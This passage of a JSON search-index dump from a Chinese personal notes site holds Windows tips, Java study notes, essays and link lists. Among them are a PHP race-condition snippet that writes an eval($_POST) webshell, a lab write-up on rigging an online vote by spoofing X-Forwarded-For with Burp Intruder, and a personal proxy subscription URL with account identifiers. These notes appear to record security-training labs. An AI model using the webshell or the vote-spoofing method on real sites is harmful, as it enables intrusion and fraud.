::\",\"\",\"runas\",1)(window.close)\u0026\u0026exit cd /d \"%~dp0\"\n```\n\t  \n右击选择bat文件，发送到桌面，在快捷方式中，选择`高级`，勾选以`管理员身份运行`\n## 开机自启\n`win+R`打开运行窗口，输入`shell:startup`，打开[[开机自启目录]]\n拖入你需要开机自启的可执行文件，如`exe`，`bat`","lastmodified":"2023-05-31T09:03:33.045907808Z","tags":null},"/%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF%E7%9B%AE%E5%BD%95":{"title":"开机自启目录","content":"\n运行窗口输入\nshell:startup\n一般是这个目录\n```\n  C:\\Users\\用户名\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\n  ```\n把你开机需要启动的东西放到目录即可","lastmodified":"2023-05-31T09:03:33.049907844Z","tags":null},"/%E5%BF%83%E6%9C%89%E6%89%80%E6%84%9F":{"title":"心有所感","content":"- [[《人生第一次》观后感]]\n- [[《算法之美》读后感]]","lastmodified":"2023-05-31T09:03:33.049907844Z","tags":null},"/%E6%83%85%E9%95%8C%E4%B8%89%E5%88%86%E6%9C%A8%E7%9B%B8%E6%80%9D%E4%B8%87%E9%AA%A8%E4%B9%A6":{"title":"情镌三分木，相思万骨书","content":"情镌三分木，相思万骨书\n\n  \n\n醉、倾城\n\n  \n\n　　几渚梁梦杯中尽，独影朱阁泪成诗？万里婵娟银河坠，星辰似海踏歌来。故梦千里清铃响，静候梵音斩红尘。——题记。\n\n　　那一世，你在这场缠绵的夜雨江南中为他悄悄的撑起那把泛青的油伞；我亦在烽台烛台望你千年之余，我曾听闻你为寻他走遍了千迢万里，踏过了雨雪绯林；而今离他只有那短短的一步之遥。看见你为了他在雨中温柔静候，那眼角滑落下的液体伴随着倾赋予他的漫天思念；静静的洒满这座城市的每一个角落。而我就这样静静的站在你们身后，多余的像极了一幅煞乱风景的残墨；顷刻间充斥着幸福流淌过的每一条暖流。但你是否曾知晓？那雨水从天而降肆无忌惮的在我的脸颊划落；泪水也参杂在雨水里紧附着思念随波逐流的晕开视线里残留下的最后一幅画面。也许你永远都不会知道，今生的我为了等候你那不轻易的回首；似乎比你等他的时间还要长。\n\n　　听人说一个人的时候，温起壶中酒；独倚拜月楼，望着庭中盛放的满院流光；凄冷的冬风定会静静的摇落下一地的相思，只为承载起那些忧伤孤独的过往，在岁月的年轮中不停的刻圈成画；却始终画不到那个所谓的终点。有你的曾经一直潜藏在故事里蔓延着最为凄美的片段，梦中的枯藤已千年不绿；被风吹干后的答案；夺走了彼此记忆中最为动人的拥抱。那些禁锢在心底深处的怅然，冲淡了相聚时的喜悦与快乐；难以掩盖的忧伤中载满了无法清点不舍与难过。\n\n　　人生短短十数载，梁月何时绕梦中？当彼此的相遇早已为离别埋下了深深的伏笔，当插肩而过时也不会在为过客不留的画面挽留下最后一丝温存；回忆总是美的让人心碎，曾经的过往依旧使人这般沉吟至今。或许那般留恋本不应该赖在记忆中，转进我心里霸占着每一寸缝隙。\n\n　　冬日春雨几月寒，半阕红豆怎续情？望穿了奈何秋水，我们终究还是等不到那不期而遇的再见。少了梦里梦外的花开，你说着曾经的相遇是如此的云淡风轻，我想着坐拥过着有你的岁月铅华；那时的我梦中藤萝不香醒，梦醒时节花落西厢。敛一轮皓月星空，抒一卷痴情惘然。怎奈文字铺垫的岁月里依旧美轮美奂，不禁让人再次心涌执念；荡漾起那假睡着的海誓山盟。我曾想待你拂去我眉宇间的忧愁，我愿牵起你的手浪迹天涯。最为灿烂的爱情，过界后也不过是烟花转瞬繁落一季。真正的爱情必然是经得起流年锦瑟的厮守，相伴过帘卷云舒的夕霞；也会共赏着烟雨散尽后的那一池澄碧。而此时的冬风枯叶镌落下一","lastmodified":"2023-05-31T09:03:33.049907844Z","tags":null},"/%E6%89%8B%E5%86%99%E4%BB%A3%E7%A0%81%E9%97%AE%E9%A2%98":{"title":"手写代码问题","content":"# 手写代码问题\n## 手写不熟练的代码\n1. 整个文件夹复制,已熟练\n## 写不来的\n1. [[手写单向链表结构]]\n2. [[手写学生信息系统]]\n3. 奇数偶数轮流输出多线程，同步锁      ","lastmodified":"2023-05-31T09:03:33.049907844Z","tags":null},"/%E6%89%8B%E5%86%99%E5%8D%95%E5%90%91%E9%93%BE%E8%A1%A8%E7%BB%93%E6%9E%84":{"title":"手写单向链表结构","content":"# 手写单向链表结构\n编写程序实现单向链表数据结构：\n\tpublic class Node {\n\t\tObject data;\n\t\tNode next;\n\t}\n\tpublic class MyLinkedList{\n\t\tNode header;\n\t\t....\n\t\t// 添加数据的方法\n\t\t// 删除数据的方法\n\t\t// 修改数据的方法\n\t\t// 查找数据的方法\n\t\t// 打印集合中每个元素的方法\n\t}\n\n\t最后编写测试程序","lastmodified":"2023-05-31T09:03:33.049907844Z","tags":null},"/%E6%89%8B%E5%86%99%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F":{"title":"手写学生信息系统","content":"# 手写学生信息系统\n1、请使用序列化和反序列化机制，完成学生信息管理系统。\n\n系统打开时显示以下信息：\n欢迎使用学生信息管理系统，请认真阅读以下使用说明：\n请输入不同的功能编号来选择不同的功能：\n[1]查看学生列表\t\n[2]保存学生\n[3]删除学生\n[4]查看某个学生详细信息\n\n--------------------------------------------------------------------\n学生信息列表展示\n学号\t\t\t姓名\t\t\t性别\n------------------------------------\n1\t\t\t\tzhangsan\t\t男\n2\t\t\t\tlisi\t\t\t女\n.....\n\n--------------------------------------------------------------------\n查看某个学生详细信息\n学号：1\n姓名：张三\n生日：1990-10-10\n性别：男\n邮箱：zhangsan@123.com\n\n---------------------------------------------------------------------\n删除学生时，需要让用户继续输入删除的学生编号，根据编号删除学生。\n\n\n注意：请使用序列化和反序列化，以保证关闭之后，学生数据不丢失。\n学生数据要存储到文件中。\n\n\n","lastmodified":"2023-05-31T09:03:33.049907844Z","tags":null},"/%E6%89%8B%E6%9C%BAwifi%E5%B1%80%E5%9F%9F%E7%BD%91%E5%86%85%E7%9A%84%E4%BB%A3%E7%90%86":{"title":"手机wifi局域网内的代理","content":"\n\n打开电脑clash，打开允许局域网代理 ![image.png](../../assets/image_1681722951209_0.png)\n记住端口号\n打开手机wifi设置\n连接wifi，打开详细设置\n选择代理-\u003e手动代理，分别设置代理ip以及端口号\n\t代理IP，电脑上ipconfig，查看wifi的局域网ip ![image.png](../../assets/image_1681723040406_0.png)\n\t端口设置clash中开启的代理端口\n\n[[其他]] :: 手机端的telegram貌似不能通过这种方式登录","lastmodified":"2023-05-31T09:03:33.049907844Z","tags":null},"/%E6%8A%95%E7%A5%A8%E7%B3%BB%E7%BB%9F%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7%E5%88%86%E6%9E%90":{"title":"投票系统程序设计缺陷分析","content":"\n# 投票系统程序设计缺陷分析\n🔗MetaURL: https://www.mozhe.cn/bug/detail/anBmazJ1NWIvcnZmcldxMnUvdzZKQT09bW96aGUmozhe\n\n![Untitled](../../assets/Untitled%2024.png)\n\n### 背景介绍\n\n年终了，公司组织了各单位\"文明窗口\"评选网上投票通知。\n\n### 实训目标\n\n1、了解浏览器插件的使用；\n2、了解开发程序员对IP地址获取方式；\n3、了解网络协议软件的使用，如burpsuite等；\n\n### 解题方向\n\n1. 点击`ggg`投票进行抓包\n    \n    ![Untitled](../../assets/Untitled%201%205.png)\n    \n\n![Untitled](../../assets/Untitled%202%204.png)\n\n1. 添加X-Forwarded-For字段\n    \n    \n    `HTTP X-Forwarded-For`**用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。**\n    \n    简单来说就是返回你的ip地址\n    \n    ```markdown\n    X-Forwarded-For:192.168.1.1\n    ```\n    \n    ![Untitled](../../assets/Untitled%203%204.png)\n    \n\n1. `ctrl+i`将添加到 intruder （攻击者）中，可以修改ip为可变化的值，快速的返回请求\n    \n    ![Cluster bomb 集速炸弹 下方的特殊符号用于修改的值](../../assets/Untitled%204%204.png)\n    \n    Cluster bomb 集速炸弹 下方的特殊符号用于修改的值\n    \n\n![设置特殊符号中的值的变化，从1加到255 （因为ip地址单个数值最大255）](../../assets/Untitled%205%203.png)\n\n设置特殊符号中的值的变化，从1加到255 （因为ip地址单个数值最大255）\n\n![Untitled](../../assets/Untitled%206%203.png)\n\n### 遇到的问题\n\n\u003caside\u003e\n💡 burp suite会弹出错误，当使用集束炸弹的时候需要分别对两个值分别进行设置numbers设置。当出现空值错误的时候，可能是因为burpsuite内的bug，点击hex和十进制就ok\n\n\u003c/aside\u003e","lastmodified":"2023-05-31T09:03:33.049907844Z","tags":null},"/%E6%91%98%E5%8F%96":{"title":"摘取","content":"- [[莫名很喜欢这个文案]]\n- [[你是我三十六度的风]]\n- [[情镌三分木，相思万骨书]]\n- [[如何写出令人心动的个人陈述]]\n- [[信封]]\n- [[过来程序员的经验]]\n- [[将压缩包放进图片里]]\n","lastmodified":"2023-05-31T09:03:33.049907844Z","tags":null},"/%E6%94%B6%E9%9B%86%E7%AE%B1":{"title":"收集箱","content":"- 软件\n\t- [[软件工具]]\n- \n\t- [[网站收集]]","lastmodified":"2023-05-31T09:03:33.049907844Z","tags":null},"/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E":{"title":"文件上传漏洞","content":"- [[01-文件上传漏洞的原理]]\n- [[02-webshell工具]]\n- [[03-网站控制工具]]\n- [[05-文件上传漏洞的利用与防御]]\n- [[靶场]]\n- [[条件竞争]]","lastmodified":"2023-05-31T09:03:33.049907844Z","tags":null},"/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E":{"title":"文件包含漏洞","content":"- [[01-什么是文件包含漏洞]]\n- [[02-php中文件上传漏洞相关函数和伪协议]]\n- [[03-dvwa]]\n- [[04-ctfhub]]\n- [[05-文件包含漏洞挖掘与利用]]\n- [[06-文件包含漏洞的防御与修复]]","lastmodified":"2023-05-31T09:03:33.049907844Z","tags":null},"/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89":{"title":"条件竞争","content":"\n\n```php\n  \u003c?PHP\n  echo md5(1);\n  fputs(fopen('3.php','w'),'\u003c?php @eval($_POST[1])?\u003e');\n  ?\u003e\n  ```\n  ","lastmodified":"2023-05-31T09:03:33.049907844Z","tags":null},"/%E7%A6%81%E7%94%A8%E7%AC%94%E8%AE%B0%E6%9C%AC%E8%87%AA%E5%B8%A6%E9%94%AE%E7%9B%98%E5%9B%9B%E7%A7%8D%E6%96%B9%E6%B3%95":{"title":"禁用笔记本自带键盘四种方法","content":"\n\u003e 笔记本外接键盘之后，老是误触笔记本自带键盘，整理一些禁用笔记本自带键盘的方法\n\n方便我的：**不要使用以下命令，这是方便我的笔记**\n```\n  pnputil /removedevice \"HIDVID_320F\u0026PID_5055\u0026MI_01\u0026COL01\\7\u00262D4F6D52\u00260\u00260000\"\n  pnputil /removedevice \"HIDVID_048D\u0026PID_C100\u0026COL03\\6\u00268BB26F5\u00260\u00260002\"\n```\n\n\n目前主要有以下几种办法：\n\n\n# 第一种：CMD 命令\n\u003e 我的电脑这种方法不管用\n1. 使用 `win` + `R` 打开运行窗口，输入 `CMD` ，然后按住 `Ctrl+Shift+Enter` 使用**管理员**打开命令提示符窗口（需要注意是用管理员的身份打开）\n2. 选择如下命令进行禁用或者启用自带键盘\n\nshell禁用\n\tsc config i8042prt start= disabled\n启用\n\tsc config i8042prt start= auto\n最后 重启笔记本\n# 第二种：设备管理器禁用\n\n\u003e 此方法用了很久, 因为我无法禁用, 卸载的话, 每次电脑开机都要设置一遍, 非常麻烦。\n\n1. 直接到设备管理进行禁用，打开设备管理的方式有很多种，比如：\n命令行输入 `Devmgmt.msc`\n`win+X` 快捷键，然后选择\n直接 win 键，然后输入设备管理器进行搜索\n或者到控制面板找，这种老土的办法我一般不用\n2. 找到对应的键盘设备 ![img](https://tc3.doingnothing.online/assets/20230105155538.png)\n3. 这里面的任何一个键盘可能是你的笔记本键盘，所以挨着试吧，禁用或者卸载都可以。**区别是卸载在重启之后会自动安装**\n4. 如果卸载错了，可以通过重新扫描设备恢复已经卸载的设备 ![img](https://tc3.doingnothing.online/assets/20230105155718.png)\n\n\n# 第三种：使用 DevCon 工具包进行卸载\n\n\u003e DevCon 是 windows 官方的一个工具包，它的作用就是**设备管理**\n\n由于安装需要安装 sdk，然后找对应的文件，所以我没有具体使用，相关教程以及官方文档如下\n1.  [使用 DevCon 工具安装驱动程序包](https://learn.microsoft.com/zhcn/windowshardware/drivers/install/usingthedevcontooltoinstalladriverpackage)\n2. [**DevCon Remove** ](https://learn.microsoft.com/zhcn/windowshardware/drivers/devtest/devconremove)\n3. [用于卸载设备的批处理文件](https://zditect.com/article/58276923.html#:~:text=%E7%94%A8%E4%BA%8E%E5%8D%B8%E8%BD%BD%E8%AE%BE%E5%A4%87%E7%9A%84%E6%89%B9%E5%A4%84%E7%90%86%E6%96%87%E4%BB%B6%201%20%E9%80%9A%E8%BF%87%E6%89%B9%E5%A4%84%E7%90%86%E6%96%87%E4%BB%B6%E5%8D%B8%E8%BD%BD%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F%20%E6%89%B9%E5%A4%84%E7%90%86%E6%96%87%E4%BB%B6%E4%BB%A5%E5%8D%B8%E8%BD%BD%E5%92%8C%E9%87%8D%E6%96%B0%E5%AE%89%E8%A3%85%E5%A3%B0%E9%9F%B3%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F%E3%80%82%20%E6%88%91%E9%9C%80%E8%A6%81%E4%B8%80%E4%B8%AA%E8%84%9A%E6%9C%AC%E6%9D%A5%E5%8D%B8%E8%BD%BD%E5%A3%B0%E9%9F%B3%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F%EF%BC%8C%E7%84%B6%E5%90%8E%E9%87%8D%E6%96%B0%E5%AE%89%E8%A3%85%E5%AE%83%E4%BB%AC%E3%80%82%20...%202%20%E4%BD%BF%E7%94%A8,%E7%89%88%E6%9C%AC%E4%BC%9A%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%8F%AF%E8%83%BD%E6%9C%89%E5%8A%A9%E4%BA%8E%E6%81%A2%E5%A4%8D%E7%9A%84%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%92%8C%E4%B8%80%E4%B8%AA%20RenewUSB%E2%80%8B.bat%EF%BC%8C%E5%88%A0%E9%99%A4%E6%89%80%E6%9C%89%20USB%20%E8%AE%BE%E5%A4%87%EF%BC%8C%E7%84%B6%E5%90%8E%E9%87%8D%E6%96%B0%E6%89%AB%E6%8F%8F%E6%96%B0%E8%AE%BE%E5%A4%87%20%E5%A6%82%E6%9E%9C%E8%AF%A5%E6%96%87%E4%BB%B6%E5%AD%98%E5%9C%A8%EF%BC%8C%E4%B8%8A%E8%BF%B0%E5%91%BD%E4%BB%A4%E5%B0%86%E5%88%A0%E9%99%A4%E5%BD%93%E5%89%8D%E7%9B%AE%E5%BD%95%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%20test.bat%E3%80%82%20...%20%E6%9B%B4%E5%A4%9A%E9%A1%B9%E7%9B%AE)\n4. [DevCon 命令行实用工具用法(安装卸载驱动)](https://blog.csdn.net/zhangzxing/article/details/9231155)\n# 第四种：PnPUtil 命令行工具（推荐）\n\n## 介绍\n官网介绍： https://learn.microsoft.com/zhcn/windowshardware/drivers/devtest/pnputil\n\n优点：**因为是自带的，不需要安装**\n\n\u003ePnPUtil (PnPUtil.exe) 是一种命令行工具，可让管理员对 [驱动程序包](https://learn.microsoft.com/zhcn/windowshardware/drivers/install/driverpackages)执行操作。\n\u003e说白了，就是主要作用就是**设备管理**\n\n**使用这个工具，你需要知道两个东西，不过如果是卸载设备，可以直接看我的实例**\n1. [命令怎么使用](https://learn.microsoft.com/zhcn/windowshardware/drivers/devtest/pnputilexamples)\n2. [设备实例 ID 怎么找](https://learn.microsoft.com/zhcn/windowshardware/drivers/install/deviceinstanceids)\n## 实例\n1. 打开设备管理器，右键选择你需要卸载的设备，选择**`属性`**![img](https://tc3.doingnothing.online/assets/20230105161153.png)\n2. 选择 `详细信息` ，`属性` 设置成 `设备实例路径`，下面的值就是 `设备实例 ID`，可以右键复制 ![img](https://tc3.doingnothing.online/assets/202301051612401679012846053140.png)\n3. 在 CMD 命令行窗口，输入一下命令就可以卸载对应的设备，关于禁用相关的命令可以参考[官方文档](https://learn.microsoft.com/zhcn/windowshardware/drivers/devtest/pnputilexamples)\n```\n  pnputil /removedevice \"设备实例ID\"\n  ```\n4. 可以看到已经卸载 ![img](https://tc3.doingnothing.online/assets/20230105161600.png)\n\n\n## 辅助\n1. 使用这种办法，是因为他可以禁用，也可以卸载\n2. 其次，命令行可以使用三方工具，能够更加便捷\n1. 我是使用的 quicker 工具，做成命令，直接按就可以\n2. 也可以写成 bat 批处理文件，每次开机运行，右键使用管理员运行即可****\n3. 当然，如果是禁用设备的，就不需要重复运行；卸载设备才需要每次开机运行，因为我的设备无法禁用，只有卸载 ![img](https://tc3.doingnothing.online/assets/20230105162309.png)\n\n# 其他方法\n在设备管理器更新驱动，然后选择一个错误的驱动文件，\n可以参考以下文章\nhttps://www.51mitang.com/zhishi/163112.html","lastmodified":"2023-05-31T09:03:33.049907844Z","tags":null},"/%E7%A8%BB%E8%B0%B7":{"title":"稻谷","content":"捣鼓的谐音，用来折腾一些玩意的记录 。\n\n- [[自建七牛云图床]]\n- [[临时邮箱]]\n- [[手机wifi局域网内的代理]]\n- [[音乐下载]]\n- [[js方式显示base64文件为图片]]\n- 电脑\n\t- [[三步简单解决3306端口占用问题]]\n\t- [[代理链接]]\n\t- [[禁用笔记本自带键盘四种方法]]\n\t- [[开机自启以管理员运行bat文件]]\n\t- [[联想拯救者系列电脑WIFI断连或无网络连接]]\n\t- [[开机自启目录]]\n- Notion\n\t- [[Notion优惠券]]\n\t- [[Notion自定义域名]]\n\t- [[首发-任意Notion账号获取教育优惠]]\n- AI\n\t- [[chatgpt]]\n- 手机\n\t- [[ADB命令]]\n\t- [[安卓相册图片隐藏]]\n\t- [[刷机常用]]\n- 博客\n\t- [[Vercel自定义域名]]\n\t- [[nextjs-notion-blog]]\n- RSS\n\t- [[RSS聚合器—如何高效查看互联网信息]]\n- 笔记软件\n\t- [[logseq]]\n","lastmodified":"2023-05-31T09:03:33.049907844Z","tags":null},"/%E7%AE%97%E6%B3%95%E4%B9%8B%E7%BE%8E%E8%AF%BB%E5%90%8E%E6%84%9F":{"title":"《算法之美》读后感","content":"\n\n- #《算法之美》 #读后感 [[观后感]]\n- 生活中很多看似复杂的问题都可以用算法解决，与浑浑噩噩的接受命运的安排，不如有点儿理性决策的精神，把决策变成一个数学问题，在这个充满不确定的时代，给咱们自己增加一点底气。\n# 个人体会\n\n无论是哪一种的算法，对于生活中来说都是具有一定的优缺点的，这是因为我们不是神。\n\n不必要去追求最优秀的算法，很多对于我们来说已经足够使用。之所以不去追求最好，因为当所有的东西都是最好的时候，其优劣性将变得不复存在，优劣性也将变得毫无意义。\n\n生活应该学会停止思考，一昧的思考，只会给自己的大脑和心灵带来巨大的伤痛。\n# 摘录\n\n\u003e 如果你了解了所有的事实，它们就不会有任何错误和不确定性，你可以直接评估什么对你来说是重要的，然后不要过早的停止。思考的时间长而努力：模型的复杂性和付出的努力都是值得的。\n\n\u003e 两性之间的情欲几乎不会随着时代的变迁而发生改变。在代数学上，我们可以称之为给定量。——托马斯\n\n\u003e 我的生命只有一次。因此，如果我能做点儿善事，或者可以向人们表示善意，让我现在就做吧！别让我拖延，别让我疏忽，因为我没有第二次生命！\n\n\u003e 用掉这个下午吧！你不可能把它带走。\n\n\u003e 心有它的理由，这是理性所不懂的。\n\n\u003e 无论何时，你发现自己站在大多数人的一边，那就是时候停下来反思一下了。\n\n\u003e 我本人是个乐观主义者，因为不乐观的话，也于事无补。 —丘吉尔\n\n\u003e 我发现，大学校园里有三个主要的行政管理问题：学生关心性爱，校友关心体育,教职员工关心停车问题。\n\n\u003e 遗憾？我曾经有过，但是算不上太多，不值得一提。 -弗兰克.辛纳屈\n\n\u003e 相信我，总有一天，当你增加了新知识的时候，就会把以前熟知的东西忘了。所以最要紧的是，不要让一些无用的知识把有用的挤出去。\n\n\u003e 你不必按照老师说的去做。你不必按照我说的去做，你甚至不必遵守法律。所有的事情都会产生后果，你要想好你是否愿意承担这些后果。","lastmodified":"2023-05-31T09:03:33.041907772Z","tags":null},"/%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8":{"title":"类加载器","content":"# 类加载器\n# 类加载器\n\nCreated: August 9, 2022 1:53 PM\nTags: 类加载\n\n## 概述\n\n专门负责加载类的命令/工具。\n`ClassLoader`\n\n## 分类\n\nJDK中自带了3个类加载器\n\n1. 启动类加载器:`rt.jar`\n2. 扩展类加载器:`ext/*.jar`\n3. 应用类加载器:`classpath` （你设置的那个环境变量）\n\n## 解释\n\nString s = \"abc\";\n\n1. 代码在开始执行之前，会将所需要类全部加载到JVM当中。\n2. 通过类加载器加载，看到以上代码类加载器会找String.class\n\t文件，找到就加载，那么是怎么进行加载的呢？\n3. **首先通过“启动类加载器”加载**。\n4. 注意：启动类加载器专门加载：`C:\\\\Program Files\\\\Java\\\\jdk1.8.0_101\\\\jre\\\\lib\\\\rt.jar`（rt.jar中都是**JDK最核心的类库**。）\n5. **如果通过“启动类加载器”加载不到的时候，会通过\"扩展类加载器\"加载**。（注意：扩展类加载器专门加载：`C:\\\\Program Files\\\\Java\\\\jdk1.8.0_101\\\\jre\\\\lib\\\\ext\\\\*.ja`r）\n6. **如果“扩展类加载器”没有加载到，那么会通过“应用类加载器”加载**。（注意：应用类加载器专门加载：**`classpath`中的类**。）\n\n## 双亲委派机制\n\n1. java中为了**保证类加载的安全**，使用了**双亲委派机制**。**优先从启动类加载器中加载**，这个称为“父”\n2. “**父”无法加载到，再从扩展类加载器中加载**，这个称为“母”。双亲委派。\n3. **如果都加载不到，才会考虑从应用类加载器中加载**。直到加载到为止。","lastmodified":"2023-05-31T09:03:33.049907844Z","tags":null},"/%E7%BD%91%E5%AE%89":{"title":"网安","content":"-  00-[[网安工具]]\n- 01-[[信息收集]]\n- 02-[[sql注入]]\n- 03-[[xss]]\n- 04-[[csrf]]\n- 05-[[文件上传漏洞]]\n- 06-[[文件包含漏洞]]\n- 07-[[xxe]]\n- 08-[[ssrf]]\n- 09-[[RCE]]\n- [[靶场]]\n- [[网安小项]]","lastmodified":"2023-05-31T09:03:33.049907844Z","tags":null},"/%E7%BD%91%E5%AE%89%E5%B0%8F%E9%A1%B9":{"title":"网安小项","content":"- [[墨者学院]]","lastmodified":"2023-05-31T09:03:33.049907844Z","tags":null},"/%E7%BD%91%E5%AE%89%E5%B7%A5%E5%85%B7":{"title":"网安工具","content":"- [[网站控制工具]]\n- [[中国蚁剑]]\n- [[burp sulite]]\n- [[中国蚁剑]]","lastmodified":"2023-05-31T09:03:33.049907844Z","tags":null},"/%E7%BD%91%E7%AB%99%E6%8E%A7%E5%88%B6%E5%B7%A5%E5%85%B7":{"title":"网站控制工具","content":"[[03-网站控制工具]]","lastmodified":"2023-05-31T09:03:33.049907844Z","tags":null},"/%E7%BD%91%E7%AB%99%E6%94%B6%E9%9B%86":{"title":"网站收集","content":"\n\n- 模仿各个操作系统：[Simone's Computer](https://simone.computer/#/webdesktops)\n- ## 办公领域\n- [[ppt]]\n\t- [[模板]]下载\n\t\t- [PPT模板_PPT模板免费下载_免费PPT模板下载 - 【爱PPT】 (2ppt.com)](https://www.2ppt.com/)\n\t\t- 毕业设计\n\t\t\t- https://www.ypppt.com/\n\t- [[ppt]]生成\n\t\t- [怡氧大纲笔记|自动生成PPT|文字大纲一键自动生成放映级演示 (jianguoyun.com)](https://cpclanding.jianguoyun.com/yiyang/notes_bd)\n\t\t- mindshow\n- [[简历]]在线制作\n\t- [简历模板_个人简历模板_简历模板下载_简历模板免费下载_简历模板下载word格式 (polebrief.com)](https://www.polebrief.com/edit)\n\t- [简历-开发者客栈-帮助开发者面试的平台-顽强网络 (developers.pub)](https://www.developers.pub/resume)","lastmodified":"2023-05-31T09:03:33.049907844Z","tags":null},"/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8":{"title":"网络安全","content":"\n- 网安小项\n\t- [[投票系统程序设计缺陷分析]]","lastmodified":"2023-05-31T09:03:33.049907844Z","tags":null},"/%E8%81%94%E6%83%B3%E6%8B%AF%E6%95%91%E8%80%85%E7%B3%BB%E5%88%97%E7%94%B5%E8%84%91WIFI%E6%96%AD%E8%BF%9E%E6%88%96%E6%97%A0%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5":{"title":"联想拯救者系列电脑WIFI断连或无网络连接","content":"\n\n ## 问题\n\n 网页出现无网络连接，但是wifi连着的情况\n\n ## 解决\n\n 可以通过修改网卡的电脑节省设置\n 1.  win+x，选择打开设备管理器 ![](https://tc3.doingnothing.online/assets/202301050344431679012790490134.png){:height 404, :width 51}\n 2. 选择网络适配器的无线网卡，点击属性 \n  ![](https://tc3.doingnothing.online/assets/202301050345321679012786257133.png)\n 3. 修改电源管理，取消勾选 ![](https://tc3.doingnothing.online/assets/20230105034544.png){:height 698, :width 214}\n 4. 如果还不行，修改  \n  ![](https://tc3.doingnothing.online/assets/20230105034609.png)\n\n ## 测试结果\n\n ![](https://tc3.doingnothing.online/assets/20230105034709.png)\n 随着windows更新，我的电脑没有出现这类问题，但是如果你的电脑有此类问问题，不妨可以试试。","lastmodified":"2023-05-31T09:03:33.049907844Z","tags":null},"/%E8%87%AA%E5%BB%BA%E4%B8%83%E7%89%9B%E4%BA%91%E5%9B%BE%E5%BA%8A":{"title":"自建七牛云图床","content":"\n\u003e 1. 使用图床的原因是方便迁移，但是缺点是，需要网络；\n\u003e 2. 对于自己的知识库来说，图床是完全没有必要的，因为本地可以随时打开，比网络加载要好很多；\n\u003e 3. 但是对于需要分享的内容来说，图床则是有很多的优点，目前市面上的笔记几乎都支持 markdown。如此，图床的图片链接就方便的很多。说白了，就是**方便迁移**\n\u003e 4. hexo 以及一些自建的服务，图片链接的路径可能采用了不同的规则。比如 hexo 需要使用项目根路径作为相对路径，更多的则是采用当前文件为相对路径的起始路径。但是网络 url 几乎是所有都兼容的。这大致就是**图床的必要性**吧\n\n## 所需\n1. 七牛云\n2. picgo，手机端可以采用小白图床\n3. 域名，方便以后图片迁移\n\n\u003e 使用七牛云的原因是，域名不用备案，同样有https协议。可以采用三方cloudflare托管域名，可玩性更高，不过可能速度会可能会变慢。\n\n## 七牛云配置\n这里不想写，直接引用别人的\nhttps://mp.weixin.qq.com/s/R26NVPo5pyuuDS_EMqqafw\n## 域名配置\n**这一步不做，就没必要自建图床。**\n\n自定义域名之后，以后服务到期或者你需要迁移的时候，直接将图片全部下载下来，然后换到别的对象存储提供商，域名绑过去，原来的图片链接还可以用。很方便。\n我的资源桶是国外的，因为我的域名没有备案。\n\n1. 进入你的资源桶 ![](https://tc3.doingnothing.online/assets/20221125162751.png)\n2. 点击域名管理，添加**自定义域名**，不是 cdn 域名，这个是加速的，如果需要可以后面设置（不设置也完全够用）。 ![](https://tc3.doingnothing.online/assets/20221125162907.png)\n3. 绑定域名 ![](https://tc3.doingnothing.online/assets/20221125163058.png)\n4. 会出现 cname 绑定，然后在你的域名服务提供商中添加 `cname` 记录即可 ![](https://tc3.doingnothing.online/assets/20221125163227.png)\n5. 点击空间管理，选择你刚才添加的域名 ![](https://tc3.doingnothing.online/assets/20221125163312.png)\n6. 这样你的图片域名就是你自己添加的了\n7. 当然，你还可以给自己弄个 ssl 证书，七牛云有免费的单域名证书。\n\n**关于迁移方案**\n目前我觉得不错的有\n\n1. 腾讯云 cos  ：[腾讯云配置教程](https://mp.weixin.qq.com/s/g_Qu75ALA4HZ3i70SM29zQ) 腾讯云有免费半年的 cos\n2. 阿里云 oos   [阿里云配置教程]( https://www.yuque.com/luwenjie/gmahbo/cglvps\n)\n\n\n\n## picgo 相关\n此工具用于自动上传，常常与一些写作或者笔记工具的插件结合使用，就不需要手动切换了\n相关的一些软件，相关的配置教程网上以及相关论坛都能找到\n1. typora  markdown 可以说是最好的编辑器\n2. obsidian  知识库软件（当然也可以说是笔记软件）\n3. quicker 相当于 win 端的 ios 快捷指令，用于一些命令和小工具的快捷使用，非常方便。可以结合使用，上传图片","lastmodified":"2023-05-31T09:03:33.049907844Z","tags":null},"/%E8%8E%AB%E5%90%8D%E5%BE%88%E5%96%9C%E6%AC%A2%E8%BF%99%E4%B8%AA%E6%96%87%E6%A1%88":{"title":"莫名很喜欢这个文案","content":"# 莫名很喜欢这个文案\n\n[莫名很喜欢这个文案：\n\n  \n\n你知道，我有很多朋友。\n\n你介意过，我有很多朋友。\n\n  \n\n我天生长袖善舞，如果愿意，可以把结识的所有人结交成朋友。\n\n除了你。\n\n我永远不想，和你做朋友。\n\n  \n\n我永远不会再主动发消息给你，\n\n永远不会再和朋友提起你，\n\n永远会控制自己，不再想到你。\n\n  \n\n你永远在我联系人的最末一位。\n\n和第一位隔了五十三页。\n\n所以有时候我想起你，就一点一点向下翻。\n\n翻到了,就不再那么想你了。\n\n  \n\n你知道吗?\n\n我的,好朋友。","lastmodified":"2023-05-31T09:03:33.049907844Z","tags":null},"/%E8%AE%A2%E9%98%85":{"title":"订阅","content":" - [GLaDOS](https://glados.rocks/console/clash)\n\t- 50天\n\t- https://update.glados-config.com/clash/298632/2761528/68154/glados-android.yaml\n\t- 